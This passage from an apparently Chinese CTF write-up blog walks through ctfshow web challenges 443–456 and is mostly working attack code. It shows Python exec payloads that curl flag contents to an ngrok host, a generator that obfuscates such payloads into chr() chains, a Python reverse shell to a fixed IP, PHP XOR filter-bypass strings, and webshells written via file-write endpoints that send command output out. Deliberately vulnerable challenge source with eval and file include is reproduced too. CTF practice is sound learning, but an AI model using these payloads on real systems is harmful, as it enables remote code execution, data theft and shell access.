<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">str</span>(None)))&amp;None=import os;os.<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl http://xx.xx.xx.xx?1=`cat /flag`&quot;</span>)</span><br><span class="line">当然可以构造数字hh</span><br><span class="line"><span class="keyword">print</span>((<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))*<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))*<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))+<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))))</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">chr</span>(<span class="number">68</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">def <span class="title function_ invoke__">getNumber3</span>(number):</span><br><span class="line">    number = <span class="keyword">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number in [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int((len(str(None))/len(str(None))))&quot;</span>, <span class="string">&quot;~int(len(str()))&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int(len(str()))&quot;</span>, <span class="string">&quot;int((len(str(None))/len(str(None))))&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % <span class="title function_ invoke__">getNumber3</span>(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&quot;</span> % <span class="title function_ invoke__">getNumber3</span>(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += f<span class="string">&quot;chr(&#123;getNumber3(ord(i))&#125;),&quot;</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:POST=import socket,subprocess,os;s=socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET,socket.SOCK_STREAM);s.<span class="title function_ invoke__">connect</span>((<span class="string">&quot;174.0.13.43&quot;</span>,<span class="number">1234</span>));os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">0</span>);os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">1</span>); os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">2</span>);p=subprocess.<span class="title function_ invoke__">call</span>([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br><span class="line">code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">globals</span>()[<span class="keyword">list</span>(<span class="title function_ invoke__">globals</span>().<span class="title function_ invoke__">keys</span>())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">globals</span>()[<span class="keyword">list</span>(<span class="title function_ invoke__">globals</span>().<span class="title function_ invoke__">keys</span>())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> =  <span class="string">&#x27;phpanfo&#x27;</span>^<span class="string">&#x27;phpznfo&#x27;</span>^<span class="string">&#x27;phprnfo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;z&#x27;</span>^<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">#phpinfo</span></span><br><span class="line"><span class="comment">#i</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415162912608.png" alt="image-20220415162912608"></p>
<h1 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure>

<h1 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();</span><br></pre></td></tr></table></figure>

<h1 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163540538.png" alt="image-20220415163540538"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163659803.png" alt="image-20220415163659803"></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    	(<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> 		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们访问&#x2F;ctf&#x2F;file post传入的s会写入shell.php中，然后当我们访问&#x2F;ctf&#x2F;exec时，就会去执行刚才的shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173649654.png" alt="image-20220415173649654"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173726802.png" alt="image-20220415173726802"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaag`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"> http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec   </span></span><br></pre></td></tr></table></figure>

<h1 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 03:36:52</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;include&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    	(<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> 		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show//ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaags`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</span></span><br></pre></td></tr></table></figure>

<h1 id="web455-456"><a href="#web455-456" class="headerlink" title="web455-456"></a>web455-456</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 04:11:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;reload&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    	(<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span 